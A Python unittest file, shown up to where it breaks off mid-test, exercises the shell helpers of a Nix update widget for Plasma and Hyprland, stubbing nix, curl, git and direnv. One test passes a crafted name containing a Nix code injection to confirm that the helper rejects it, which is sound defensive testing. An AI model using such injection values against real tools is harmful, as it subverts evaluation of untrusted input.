import json
import os
import re
import shutil
import subprocess
import tempfile
import time
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

HELPERS = Path(__file__).resolve().parents[1] / "package/contents/tools/sh"


class HelperCase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="nixdatifier-test-")
        self.root = Path(self.temp.name)
        self.env = dict(
            os.environ,
            XDG_CACHE_HOME=str(self.root / "cache"),
            XDG_RUNTIME_DIR=str(self.root),
        )
        self.bin = self.root / "bin"
        self.bin.mkdir()
        self.env["PATH"] = str(self.bin) + os.pathsep + os.environ["PATH"]

    def tearDown(self):
        self.temp.cleanup()

    def script(self, path, source):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("#!/usr/bin/env bash\nset -eu\n" + source)
        path.chmod(0o755)
        return str(path)

    def run_helper(self, name, *args, env=None):
        return subprocess.run(
            [str(HELPERS / name), *args],
            check=False,
            env={**self.env, **(env or {})},
            text=True,
            capture_output=True,
            timeout=15,
        )


class Helpers(HelperCase):
    def test_sysinfo_distribution_detection(self):
        source = (HELPERS / "sysinfo").read_text()
        os_release = self.root / "os-release"
        marker = self.root / "NIXOS"
        helper = self.root / "sysinfo"
        helper.write_text(
            source.replace("/etc/os-release", str(os_release))
            .replace("/etc/NIXOS", str(marker))
            .replace("/run/current-system/nixos-version", str(self.root / "version"))
            .replace("/nix/var/nix/profiles/system", str(self.root / "system"))
        )
        helper.chmod(0o755)
        for distro, expected in [
            ("ubuntu", "0"),
            ("nixos", "1"),
            ('"nixos"', "1"),
            ("'nixos'", "1"),
            ("nixos-other", "0"),
        ]:
            with self.subTest(distro=distro):
                os_release.write_text("ID=" + distro + "\n")
                result = subprocess.run(
                    [str(helper)],
                    env=self.env,
                    text=True,
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
                self.assertEqual(result.returncode, 0)
                fields = result.stdout.split("---")
                self.assertEqual(len(fields), 6)
                self.assertEqual(fields[5].strip(), expected)
        marker.touch()
        os_release.unlink()
        result = subprocess.run([str(helper)], env=self.env, text=True, capture_output=True, timeout=5, check=False)
        self.assertEqual(result.stdout.split("---")[5].strip(), "1")

    def test_cache_is_shared_across_install_paths_and_serialized(self):
        counter = self.root / "count"
        source = f"printf 'probe\\n' >> '{counter}'\nsleep .2\nprintf 'result'\n"
        a = self.script(self.root / "plasma/diskusage", source)
        b = self.script(self.root / "hyprland/diskusage", source)
        commands = [[str(HELPERS / "run"), "cached", "disk", "60", "--", helper] for helper in (a, b)]
        jobs = [subprocess.Popen(c, env=self.env, stdout=subprocess.PIPE, text=True) for c in commands]
        self.assertEqual([p.communicate(timeout=5)[0] for p in jobs], ["result", "result"])
        self.assertEqual(counter.read_text().splitlines(), ["probe"])

    def test_store_measurement_follows_store_changes_from_anywhere(self):
        counter = self.root / "count"
        probe = self.script(self.root / "diskusage", f"printf 'probe\\n' >> '{counter}'\nprintf 'r'\n")
        store = self.root / "store"
        store.mkdir()
        self.env["NIXDATIFIER_STORE_WATCH"] = str(store)

        def measure():
            self.run_helper("run", "cached", "disk", "21600", "--", probe)
            return len(counter.read_text().splitlines())

        def age_result(seconds):
            for f in (self.root / "cache/nixdatifier").glob("disk-*.result"):
                t = f.stat().st_mtime - seconds
                os.utime(f, (t, t))

        self.assertEqual(measure(), 1)
        age_result(3600)
        # Nothing changed: an hour-old result is still good.
        self.assertEqual(measure(), 1)
        # A rebuild or GC elsewhere touches the store: measured again.
        os.utime(store, (store.stat().st_mtime + 5,) * 2)
        self.assertEqual(measure(), 2)
        # But not again and again while the store keeps changing.
        os.utime(store, (store.stat().st_mtime + 5,) * 2)
        self.assertEqual(measure(), 2)

    def test_failed_reads_are_not_cached(self):
        broken = self.script(self.bin / "broken", "echo partial; exit 9\n")
        result = self.run_helper("run", "cached", "test", "60", "--", broken)
        self.assertEqual(result.returncode, 9)
        self.assertEqual(list((self.root / "cache/nixdatifier").glob("*.result")), [])

    def test_homepages_are_parsed_as_one_batch(self):
        names = [f"fixture-package-{n}" for n in range(200)]
        payload = self.root / "homepages.json"
        payload.write_text(json.dumps({n: f"https://example.org/{n}" for n in names}))
        self.script(self.bin / "nix", f"cat '{payload}'\n")
        self.script(self.bin / "find", "exit 0\n")
        import shutil

        real_jq = shutil.which("jq")
        calls = self.root / "jq-calls"
        self.script(self.bin / "jq", f"echo call >> '{calls}'; exec '{real_jq}' \"$@\"\n")
        result = self.run_helper("meta", *names)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.splitlines(),
            [f"{n}\thttps://example.org/{n}\tnixpkgs" for n in names],
        )
        self.assertEqual(len(calls.read_text().splitlines()), 2)

    def test_partial_flake_check_retries_without_caching_failure(self):
        counter = self.root / "probes"
        helper = self.script(
            self.bin / "flake-probe",
            f"""
if [[ ! -f '{counter}' ]]; then
    touch '{counter}'
    printf 'nixpkgs\\tunreachable\\told\\t\\t0\\turl\\n'
else
    printf 'nixpkgs\\tok\\told\\tnew\\t0\\turl\\n'
fi
""",
        )
        args = ("cached", "flake:test", "30", "--", helper)
        first = self.run_helper("run", *args)
        self.assertIn("\tunreachable\t", first.stdout)
        self.assertEqual(list((self.root / "cache/nixdatifier").glob("*.result")), [])
        second = self.run_helper("run", *args)
        self.assertIn("\tok\t", second.stdout)
        # Previously installed versions may have left failed cached results.
        result_file = next((self.root / "cache/nixdatifier").glob("*.result"))
        result_file.write_text(first.stdout)
        self.assertIn("\tok\t", self.run_helper("run", *args).stdout)

    def test_github_probe_uses_direct_commit_and_falls_back_to_git(self):
        old, new = "a" * 40, "b" * 40
        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "nodes": {
                        "root": {"inputs": {"nixpkgs": "nixpkgs"}},
                        "nixpkgs": {
                            "original": {
                                "type": "github",
                                "owner": "NixOS",
                                "repo": "nixpkgs",
                                "ref": "branch/with-slash",
                            },
                            "locked": {"rev": old, "lastModified": 1},
                        },
                    }
                }
            )
        )
        args = self.root / "curl-args"
        git_called = self.root / "git-called"
        self.script(self.bin / "curl", f"printf '%s\\n' \"$@\" > '{args}'\nprintf '{new}'\n")
        self.script(
            self.bin / "git",
            f"touch '{git_called}'; printf '{new}\\trefs/heads/test\\n'\n",
        )
        result = self.run_helper("flake-probe", str(self.root))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
        self.assertIn("/commits/branch%2Fwith-slash", args.read_text())
        self.assertFalse(git_called.exists())
        self.script(self.bin / "curl", "exit 22\n")
        result = self.run_helper("flake-probe", str(self.root))
        self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
        self.assertTrue(git_called.exists())
        self.script(self.bin / "git", "exit 128\n")
        self.assertIn("\tunreachable\t", self.run_helper("flake-probe", str(self.root)).stdout)
        self.script(
            self.bin / "git",
            "echo 'Could not resolve host: github.com' >&2; exit 128\n",
        )
        self.assertIn("DNS lookup failed", self.run_helper("flake-probe", str(self.root)).stdout)
        self.script(self.bin / "git", "exit 124\n")
        self.assertIn("timed out after 40s", self.run_helper("flake-probe", str(self.root)).stdout)

    def test_tarball_probe_compares_content_and_reports_failures(self):
        url = "https://example.org/nixpkgs/nixos-unstable.tar.zst"
        locked_url = "https://example.org/nixpkgs/revision.tar.zst"
        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "root": "config",
                    "nodes": {
                        "config": {"inputs": {"nixpkgs": "nixpkgs"}},
                        "nixpkgs": {
                            "original": {"type": "tarball", "url": url},
                            "locked": {"type": "tarball", "narHash": "sha256-old", "lastModified": 1},
                        },
                    },
                }
            )
        )
        payload = self.root / "metadata.json"
        args = self.root / "nix-args"
        self.script(self.bin / "nix", f"printf '%s\\n' \"$@\" > '{args}'; cat '{payload}'\n")
        self.script(self.bin / "git", "exit 99\n")
        for content_hash, status in (("sha256-old", "unchanged"), ("sha256-new", "ok")):
            with self.subTest(status=status):
                payload.write_text(json.dumps({"locked": {"narHash": content_hash, "url": locked_url}}))
                result = self.run_helper("flake-probe", str(self.root))
                self.assertEqual(result.returncode, 0, result.stderr)
                fields = result.stdout.strip().split("\t")
                self.assertEqual(fields[:6], ["nixpkgs", status, "sha256-old", content_hash, "1", url])
                self.assertEqual(fields[6], locked_url)
                self.assertEqual(
                    args.read_text().splitlines(),
                    [
                        "flake",
                        "metadata",
                        "--refresh",
                        "--json",
                        "--no-write-lock-file",
                        url,
                    ],
                )
        for response in ("exit 1", "echo invalid", "echo '{}'"):
            self.script(self.bin / "nix", response + "\n")
            result = self.run_helper("flake-probe", str(self.root))
            self.assertIn("\tunreachable\t", result.stdout)
            self.assertIn("Could not resolve tarball metadata", result.stdout)

    def test_wrapper_flake_reports_nested_inputs(self):
        def node(owner, repo, rev):
            return {
                "original": {"type": "github", "owner": owner, "repo": repo},
                "locked": {"type": "github", "owner": owner, "repo": repo, "rev": rev, "lastModified": 1},
            }

        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "root": "root",
                    "nodes": {
                        "root": {"inputs": {"nix-config": "nix-config"}},
                        "nix-config": {
                            **node("me", "nix-config", "c" * 40),
                            "inputs": {"nixpkgs": "nixpkgs", "hm": ["nix-config", "nixpkgs"]},
                        },
                        "nixpkgs": node("NixOS", "nixpkgs", "a" * 40),
                    },
                }
            )
        )
        self.script(self.bin / "curl", "echo " + "a" * 40 + "\n")
        out = self.run_helper("flake-probe", str(self.root)).stdout
        names = sorted(line.split("\t")[0] for line in out.splitlines())
        self.assertEqual(names, ["nix-config", "nix-config/nixpkgs"])

    def test_path_wrapper_resolves_follows_without_duplicate_requests(self):
        old, new = "a" * 40, "b" * 40
        dependency = {
            "original": {"type": "github", "owner": "o", "repo": "r"},
            "locked": {"rev": old},
            "inputs": {"deeper": "deep"},
        }
        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "root": "config",
                    "nodes": {
                        "config": {
                            "inputs": {
                                "wrapper": "local",
                                "direct": ["wrapper", "dep"],
                                "alias": ["direct"],
                            }
                        },
                        "local": {
                            "original": {"type": "path", "path": "./public"},
                            "locked": {"type": "path", "path": "./public"},
                            "inputs": {"dep": "dependency", "alias": ["direct"]},
                        },
                        "dependency": dependency,
                        "deep": dependency,
                    },
                }
            )
        )
        calls = self.root / "requests"
        self.script(self.bin / "curl", f"echo request >> '{calls}'; echo {new}\n")
        self.script(self.bin / "git", "exit 99\n")
        result = self.run_helper("flake-probe", str(self.root))
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = {fields[0]: fields for fields in (line.split("\t") for line in result.stdout.splitlines())}
        self.assertEqual(set(rows), {"wrapper", "direct"})
        self.assertEqual(rows["direct"][1:4], ["ok", old, new])
        self.assertEqual(calls.read_text().splitlines(), ["request"])

    def _tarball_lock(self):
        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "root": "root",
                    "nodes": {
                        "root": {"inputs": {"nixpkgs": "nixpkgs"}},
                        "nixpkgs": {
                            "original": {"type": "tarball", "url": "https://c.example/nixexprs.tar.xz"},
                            "locked": {
                                "type": "tarball",
                                "url": "https://r.example/nixos-1.abc1234/nixexprs.tar.xz?lastModified=1&narHash=x",
                                "narHash": "sha256-old",
                                "lastModified": 1,
                            },
                        },
                    },
                }
            )
        )

    def test_tarball_cheap_check_avoids_downloading(self):
        self._tarball_lock()
        self.script(self.bin / "nix", "exit 99\n")  # must not be needed
        locked = "https://r.example/nixos-1.abc1234/nixexprs.tar.xz"
        newer = "https://r.example/nixos-2.def5678/nixexprs.tar.xz"
        for link, effective, status in (
            (locked, locked, "unchanged"),
            (newer, newer, "ok"),
            (newer, "https://cdn.example/x", "ok"),  # the immutable marker wins over the final hop
            (locked + "?edition=2", locked + "?edition=2", "ok"),  # a server's own query selects another archive
            ("", locked, "unchanged"),  # no marker, but we landed on the locked archive
        ):
            with self.subTest(status=status, link=link, effective=effective):
                header = f"Link: <{link}>; rel=immutable\\n" if link else ""
                self.script(
                    self.bin / "curl",
                    f"printf 'HTTP/2 302\\n{header}\\n__EFFECTIVE__%s\\n' '{effective}'\n",
                )
                fields = self.run_helper("flake-probe", str(self.root)).stdout.strip().split("\t")
                self.assertEqual(fields[1], status)

    def test_tarball_cheap_check_falls_back_when_unsure(self):
        self._tarball_lock()
        self.script(self.bin / "nix", 'echo \'{"locked": {"narHash": "sha256-old"}}\'\n')
        for curl in (
            "exit 22",  # HTTP error or dead connection
            "printf 'HTTP/2 302\\n\\n__EFFECTIVE__%s\\n' https://elsewhere.example/mutable.tar.xz",  # no marker
        ):
            with self.subTest(curl=curl):
                self.script(self.bin / "curl", curl + "\n")
                fields = self.run_helper("flake-probe", str(self.root)).stdout.strip().split("\t")
                self.assertEqual(fields[1], "unchanged")  # decided by Nix's content hash instead

    def test_tarball_checks_can_be_disabled(self):
        self._tarball_lock()
        self.script(self.bin / "nix", "exit 99\n")
        self.script(self.bin / "curl", "exit 99\n")
        out = self.run_helper("flake-probe", str(self.root), env={"FLAKE_PROBE_TARBALLS": "0"}).stdout
        self.assertEqual(out.split("\t")[1], "pinned")

    def test_deep_mode_walks_transitive_inputs(self):
        def node(repo, inputs=None):
            n = {
                "original": {"type": "github", "owner": "o", "repo": repo},
                "locked": {"type": "github", "owner": "o", "repo": repo, "rev": "a" * 40, "lastModified": 1},
            }
            return {**n, "inputs": inputs} if inputs else n

        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "root": "root",
                    "nodes": {
                        "root": {"inputs": {"a": "a", "b": "b"}},
                        "a": node("a", {"c": "c"}),
                        "b": node("b"),
                        "c": node("c", {"d": "d"}),
                        "d": node("d"),
                    },
                }
            )
        )
        self.script(self.bin / "curl", "echo " + "a" * 40 + "\n")
        names = lambda env: sorted(  # noqa: E731
            line.split("\t")[0] for line in self.run_helper("flake-probe", str(self.root), env=env).stdout.splitlines()
        )
        self.assertEqual(names({}), ["a", "b"])
        self.assertEqual(names({"FLAKE_PROBE_DEEP": "1"}), ["a", "a/c", "a/c/d", "b"])

    def test_deep_mode_has_no_depth_limit(self):
        nodes = {"root": {"inputs": {"n0": "n0"}}}
        for i in range(12):
            nodes[f"n{i}"] = {
                "original": {"type": "github", "owner": "o", "repo": f"r{i}"},
                "locked": {"type": "github", "rev": "a" * 40, "lastModified": 1},
                "inputs": {f"n{i + 1}": f"n{i + 1}"} if i < 11 else {},
            }
        (self.root / "flake.lock").write_text(json.dumps({"root": "root", "nodes": nodes}))
        self.script(self.bin / "curl", "echo " + "a" * 40 + "\n")
        out = self.run_helper("flake-probe", str(self.root), env={"FLAKE_PROBE_DEEP": "1"}).stdout
        self.assertEqual(len(out.splitlines()), 12)

    def test_release_notes_lists_new_releases_and_commits(self):
        old, new = "a" * 40, "b" * 40
        commits = [
            {
                "sha": new,
                "html_url": "https://github.com/o/r/commit/" + new,
                "author": {"login": "dev"},
                "commit": {
                    "message": "fix: thing\n\nlong body",
                    "committer": {"date": "2026-02-02T00:00:00Z"},
                },
            },
            {
                "sha": old,
                "html_url": "",
                "author": None,
                "commit": {
                    "message": "old",
                    "committer": {"date": "2026-01-01T00:00:00Z"},
                },
            },
        ]
        releases = [
            {
                "tag_name": "v2",
                "name": "",
                "draft": False,
                "prerelease": False,
                "published_at": "2026-02-01T00:00:00Z",
                "html_url": "u2",
                "body": "## Notes ##\r\n<!-- x -->hi `code`",
            },
            {
                "tag_name": "draft",
                "draft": True,
                "published_at": "2026-02-01T00:00:00Z",
            },
            {"tag_name": "v1", "draft": False, "published_at": "2025-12-01T00:00:00Z"},
        ]
        (self.root / "commits.json").write_text(json.dumps(commits))
        (self.root / "releases.json").write_text(json.dumps(releases))
        log = self.root / "curl-log"
        self.script(
            self.bin / "curl",
            f"""
url="${{@: -1}}"; out=""; hdr=""
while [ $# -gt 0 ]; do
    case "$1" in -o) out="$2"; shift ;; -D) hdr="$2"; shift ;; esac
    shift
done
echo "$url" >> '{log}'
case "$url" in
    *"/commits?"*) cp '{self.root}/commits.json' "$out"; printf 'link: <x>; rel="next"\r\n' > "$hdr" ;;
    *) cp '{self.root}/releases.json' "$out"; : > "$hdr" ;;
esac
printf 200
""",
        )
        since = "1767225600"  # 2026-01-01T00:00:00Z, the old revision's date
        result = self.run_helper("release-notes", "https://github.com/o/r.git", old, new, since)
        self.assertEqual(result.returncode, 0, result.stderr)
        data = json.loads(result.stdout)
        self.assertEqual(data["compareUrl"], f"https://github.com/o/r/compare/{old}...{new}")
        self.assertEqual([r["tag"] for r in data["releases"]], ["v2"])
        self.assertEqual(data["releases"][0]["body"], "**Notes**\nhi code")
        self.assertEqual([c["message"] for c in data["commits"]], ["fix: thing"])
        self.assertTrue(data["moreCommits"])
        self.assertIn(f"sha={new}&since=2026-01-01T00:00:01Z", log.read_text())

        self.script(
            self.bin / "curl",
            """
while [ $# -gt 0 ]; do [ "$1" = -D ] && printf 'x-ratelimit-remaining: 0\r\n' > "$2"; shift; done
printf 403
""",
        )
        result = self.run_helper("release-notes", "https://github.com/o/r", old, new, since)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("rate limit", result.stderr)

        gitlab = json.loads(
            self.run_helper("release-notes", "git+https://gitlab.com/g/sub/r.git", old, new, "0").stdout
        )
        self.assertEqual(gitlab["compareUrl"], f"https://gitlab.com/g/sub/r/-/compare/{old}...{new}")
        other = json.loads(self.run_helper("release-notes", "https://git.sr.ht/~u/r", old, new, "0").stdout)
        self.assertEqual(other["compareUrl"], "")

    def test_change_counts_use_closure_direction_and_reuse_cache(self):
        args = self.root / "count-args"
        self.script(
            self.bin / "nix",
            f"printf '%s\\n' \"$@\" >> '{args}'\n"
            + "printf '\\033[32mone: ∅ → 1.0, +2 KiB\\033[0m\\n'\n"
            + "printf 'two: 2.0 → ∅, -3 MiB\\nthree: 1.0 → 2.0, +1 MiB\\nfour: 3.1 -> 3.2\\n'\n",
        )
        for _ in range(2):
            result = self.run_helper(
                "run",
                "cached",
                "generation-counts",
                "604800",
                "--",
                str(HELPERS / "change-counts"),
                "/nix/store/new",
                "/nix/store/old",
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(
                json.loads(result.stdout),
                {
                    "added": 1,
                    "removed": 1,
                    "changed": 2,
                    "addedBytes": 2048,
                    "removedBytes": 3145728,
                },
            )
        self.assertEqual(
            args.read_text().splitlines(),
            [
                "--extra-experimental-features",
                "nix-command flakes",
                "store",
                "diff-closures",
                "/nix/store/old",
                "/nix/store/new",
            ],
        )

    def test_change_count_failure_and_identical_closures(self):
        self.script(self.bin / "nix", "echo 'closure missing' >&2; exit 8\n")
        result = self.run_helper("change-counts", "/nix/store/new", "/nix/store/old")
        self.assertEqual(result.returncode, 8)
        self.assertEqual(result.stdout, "")
        result = self.run_helper("change-counts", "/nix/store/same", "/nix/store/same")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            json.loads(result.stdout),
            {
                "added": 0,
                "removed": 0,
                "changed": 0,
                "addedBytes": 0,
                "removedBytes": 0,
            },
        )

    def test_conflicting_mutation_is_rejected(self):
        started = self.root / "started"
        blocker = self.script(self.bin / "blocker", f"touch '{started}'; sleep 1\n")
        job = subprocess.Popen([str(HELPERS / "run"), "mutate", "--", blocker], env=self.env)
        try:
            for _ in range(100):
                if started.exists():
                    break
                time.sleep(0.01)
            result = self.run_helper("run", "mutate", "--", "true")
            self.assertEqual(result.returncode, 75)
        finally:
            job.wait(timeout=3)

    def test_terminal_reports_real_failure_and_preserves_quoted_workdir(self):
        work = self.root / "flake's directory"
        work.mkdir()
        user_shell = self.script(self.bin / "test-shell", 'exec bash --noprofile --norc -c "$2"\n')
        self.script(self.bin / "getent", f"printf 'test:x:1:1:Test:/tmp:{user_shell}\\n'\n")
        terminal = self.script(self.bin / "test-terminal", 'shift; exec setsid "$@"\n')
        result = self.run_helper("terminal", terminal, str(work), "pwd > actual-dir; exit 37")
        self.assertEqual(result.returncode, 37, result.stderr)
        self.assertEqual((work / "actual-dir").read_text().strip(), str(work))

    def test_dry_preview_never_writes_lockfile(self):
        args = self.root / "nix-args"
        self.script(self.bin / "nix-store", "exit 0\n")
        self.script(self.bin / "nix", f"printf '%s\\n' \"$@\" > '{args}'\nexit 0\n")
        work = self.root / "flake directory"
        work.mkdir()
        lock = work / "flake.lock"
        lock.write_text("original")
        result = self.run_helper(
            "dry-run-preview",
            str(work),
            "nixpkgs",
            "github:NixOS/nixpkgs/revision",
            "auto",
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--no-write-lock-file", args.read_text().splitlines())
        self.assertEqual(lock.read_text(), "original")

    def test_settings_agree_across_hosts(self):
        """main.xml, Settings.qml, the Hyprland adapter, the editor schema and
        the Plasma config page must declare the same keys and defaults."""
        repo = HELPERS.parents[3]
        ui = repo / "package/contents/ui"
        ns = {"k": "http://www.kde.org/standards/kcfg/1.0"}
        xml = {}
        for entry in ET.parse(repo / "package/contents/config/main.xml").getroot().iterfind(".//k:entry", ns):
            kind, text = entry.get("type"), entry.findtext("k:default", "", ns) or ""
            xml[entry.get("name")] = (
                text == "true"
                if kind == "Bool"
                else int(text)
                if kind == "Int"
                else float(text)
                if kind == "Double"
                else text
            )

        def qml_defaults(source):
            found = {}
            for kind, name, value in re.findall(
                r"^\s*property (bool|int|real|string|color) (\w+): (.+)$", source, re.M
            ):
                found[name] = float(json.loads(value)) if kind == "real" else json.loads(value)
            return found

        host_only = {"pillMode", "popupPosition", "panelEdgeOffset", "panelSideOffset"}
        settings = qml_defaults((ui / "Settings.qml").read_text())
        shell = (repo / "hyprland/NixdatifierShell.qml").read_text()
        adapter = qml_defaults(shell[shell.index("id: cfg") : shell.index("App.Settings")])
        schema = set(re.findall(r'"key": "(\w+)"', (ui / "SettingsSchema.js").read_text()))
        aliases = set(re.findall(r"cfg_(\w+):", (ui / "configGeneral.qml").read_text()))
        for name, host in (("Settings.qml", settings), ("Hyprland adapter", adapter)):
            self.assertEqual({k: v for k, v in host.items() if k not in host_only}, xml, name)
        self.assertEqual(schema, set(xml))
        self.assertEqual(aliases, set(xml) | {name + "Default" for name in xml})

    def test_flake_context_fingerprint_changes(self):
        flake = self.root / "flake directory"
        flake.mkdir()
        (flake / "flake.lock").write_text("old")
        old = self.run_helper("flake-context", str(flake)).stdout.splitlines()
        (flake / "flake.lock").write_text("new")
        new = self.run_helper("flake-context", str(flake)).stdout.splitlines()
        self.assertEqual(old[0], str(flake))
        self.assertNotEqual(old[1], new[1])

    def test_devenv_discover_lists_known_projects_newest_first(self):
        data = self.root / "data"
        old, new, gone, blocked = (self.root / n for n in ("old", "new", "gone", "blocked"))
        for project in (old, new, blocked):
            project.mkdir()
            (project / ".envrc").write_text("use flake\n")
        for state, name, project, stamp in (
            ("allow", "a", old, 1_000),
            ("allow", "b", new, 2_000),
            ("allow", "c", gone, 3_000),
            ("deny", "d", blocked, 4_000),
        ):
            entry = data / "direnv" / state / name
            entry.parent.mkdir(parents=True, exist_ok=True)
            entry.write_text(f"{project}/.envrc\n")
            os.utime(entry, (stamp, stamp))
        self.env["XDG_DATA_HOME"] = str(data)
        result = self.run_helper("devenv", "discover")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.splitlines(),
            [f"{blocked}\tdenied", f"{new}\tallowed", f"{old}\tallowed"],
        )

    def test_devenv_inspect_reports_direnv_flake_and_lock(self):
        project = self.root / "my app"
        project.mkdir()
        (project / ".envrc").write_text("use flake\ndotenv\n")
        (project / "flake.nix").write_text('{\n  description = "A demo shell";\n}\n')
        (project / ".direnv").mkdir()
        (project / "flake.lock").write_text(
            json.dumps(
                {
                    "nodes": {
                        "root": {"inputs": {"nixpkgs": "nixpkgs", "utils": ["nixpkgs"]}},
                        "nixpkgs": {
                            "original": {
                                "type": "github",
                                "owner": "NixOS",
                                "repo": "nixpkgs",
                                "ref": "nixos-unstable",
                            },
                            "locked": {
                                "type": "github",
                                "rev": "abcdef0123456789",
                                "lastModified": 1700000000,
                            },
                        },
                    }
                }
            )
        )
        self.script(
            self.bin / "direnv",
            """
case "$1" in
    version) echo 2.37.1 ;;
    status) echo "Found RC path $PWD/.envrc"; echo "Found RC allowed 1" ;;
esac
""",
        )
        # inspect must stay fast: it never evaluates the flake.
        marker = self.root / "nix-ran"
        self.script(self.bin / "nix", f"touch '{marker}'\n")
        result = self.run_helper("devenv", "inspect", str(project))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(marker.exists())
        meta, envrc, locks, shells = result.stdout.split("\x1e")
        facts = dict(line.split("=", 1) for line in meta.splitlines())
        self.assertEqual(facts["name"], "my app")
        self.assertEqual(facts["direnv"], "2.37.1")
        self.assertEqual(facts["envrc_state"], "blocked")
        self.assertEqual(facts["envrc_uses"], "use flake,dotenv")
        self.assertEqual(facts["description"], "A demo shell")
        self.assertEqual(facts["lock_inputs"], "2")
        self.assertEqual(facts["lock_oldest"], "1700000000")
        self.assertIn("flake.nix", facts["files"].split(","))
        self.assertEqual(envrc, "use flake\ndotenv")
        self.assertEqual(
            locks.splitlines(),
            [
                "nixpkgs\tgithub\tNixOS/nixpkgs\tnixos-unstable\tabcdef0\t1700000000\t",
                "utils\tfollows\t\t\t\t0\tnixpkgs",
            ],
        )
        self.assertEqual(shells, "")

    def test_devenv_lists_shells_and_their_packages(self):
        project = self.root / "app"
        project.mkdir()
        (project / "flake.nix").write_text("{}")
        self.script(
            self.bin / "nix",
            """
case "$*" in
    *attrNames*) printf '["default","ci"]' ;;
    *buildInputs*) printf '["git-2.50","jq-1.8","git-2.50"]' ;;
    *) exit 1 ;;
esac
""",
        )
        shells = self.run_helper("devenv", "shells", str(project))
        self.assertEqual(shells.stdout.splitlines(), ["default", "ci"])
        packages = self.run_helper("devenv", "shellpkgs", str(project), "default")
        self.assertEqual(packages.stdout.splitlines(), ["git-2.50", "jq-1.8"])
        # Names are interpolated into a Nix attribute path, so they are checked.
        bad = self.run_helper("devenv", "shellpkgs", str(project), 'x"; builtins.abort "')
        self.assertEqual(bad.returncode, 2)
        # A failed evaluation is reported, never shown as an empty shell.
        self.script(self.bin / "nix", "exit 1\n")
        self.assertEqual(self.run_helper("devenv", "shells", str(project)).returncode, 3)

    def test_devenv_space_and_clear(self):
        data = self.root / "data"
        big, small, plain = (self.root / n for n in ("big", "small", "plain"))
        for project in (big, small, plain):
            (project / ".direnv").mkdir(parents=True)
            (project / ".envrc").write_text("use flake\n")
            entry = data / "direnv" / "allow" / project.name
            entry.parent.mkdir(parents=True, exist_ok=True)
            entry.write_text(f"{project}/.envrc\n")
        for project in (big, small):
            (project / ".direnv" / "flake-profile-abc").symlink_to("/nix/store/x-profile")
        (plain / ".direnv" / "cache.bin").write_bytes(b"x" * 4096)
        # Allocated disk usage includes directory blocks and varies by filesystem.
        self.script(
            self.bin / "du",
            f"""
[[ "$#" == 2 && "$1" == -sk && "$2" == '{plain}/.direnv' ]]
printf '4\\t%s\\n' "$2"
""",
        )
        self.script(
            self.bin / "nix",
            f"""
case "$*" in
    *{big}*) echo "/nix/store/x-profile 9000" ;;
    *) echo "/nix/store/x-profile 100" ;;
esac
""",
        )
        self.env["XDG_DATA_HOME"] = str(data)
        result = self.run_helper("devenv", "space")
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = [line.split("\t") for line in result.stdout.splitlines()]
        self.assertEqual(
            [(r[0], r[1], r[2]) for r in rows],
            [
                (str(big), "9000", "closure"),
                (str(plain), "4096", "files"),
                (str(small), "100", "closure"),
            ],
        )
        cleared = self.run_helper("devenv", "clear", str(big))
        self.assertEqual(cleared.returncode, 0, cleared.stderr)
        self.assertFalse((big / ".direnv").exists())
        self.assertTrue((big / ".envrc").exists())
        # Only direnv projects are touched.
        stray = self.root / "stray"
        (stray / ".direnv").mkdir(parents=True)
        self.assertEqual(self.run_helper("devenv", "clear", str(stray)).returncode, 2)
        self.assertTrue((stray / ".direnv").exists())

    def test_health_reports_caches_failed_units_and_nix(self):
        self.script(
            self.bin / "nix",
            """
case "$1" in
    --version) echo 'nix (Nix) 2.34.0' ;;
    config) printf 'experimental-features = flakes nix-command\\nsubstituters = https://good.example/ https://good.example https://dead.example\\ntrusted-users = root\\n' ;;
esac
""",
        )
        self.script(
            self.bin / "curl",
            """
case "$*" in
    *good.example*) printf '200 0.120' ;;
    *) printf '000 3.000' ;;
esac
""",
        )
        self.script(
            self.bin / "systemctl",
            """
case "$*" in
    *show*) echo 'exit-code' ;;
    *--user*) echo 'mine.service loaded failed failed Mine' ;;
    *) echo 'sshd.service loaded failed failed SSH' ;;
esac
""",
        )
        # The error line wins over a generic last line.
        self.script(
            self.bin / "journalctl",
            """
printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process exited\\n'
""",
        )
        result = self.run_helper("health")
        self.assertEqual(result.returncode, 0, result.stderr)
        meta, units, caches = result.stdout.split("\x1e")
        facts = dict(line.split("=", 1) for line in meta.splitlines())
        self.assertEqual(facts["nix"], "nix (Nix) 2.34.0")
        self.assertEqual(facts["experimental"], "flakes nix-command")
        why = "Failed to register: Unable to acquire bus name"
        self.assertEqual(
            units.splitlines(),
            [
                f"system\tsshd.service\texit-code\t{why}",
                f"user\tmine.service\texit-code\t{why}",
            ],
        )
        cache_rows = sorted(line.split("\t") for line in caches.splitlines())
        # The duplicate with a trailing slash is checked once.
        self.assertEqual(
            [(r[0], r[1]) for r in cache_rows],
            [("https://dead.example", "unreachable"), ("https://good.example", "ok")],
        )

    def test_devenv_handles_a_plain_folder(self):
        project = self.root / "plain"
        project.mkdir()
        self.script(self.bin / "direnv", 'case "$1" in version) echo 2.37.1 ;; esac\n')
        result = self.run_helper("devenv", "inspect", str(project))
        self.assertEqual(result.returncode, 0, result.stderr)
        facts = dict(line.split("=", 1) for line in result.stdout.split("\x1e")[0].splitlines())
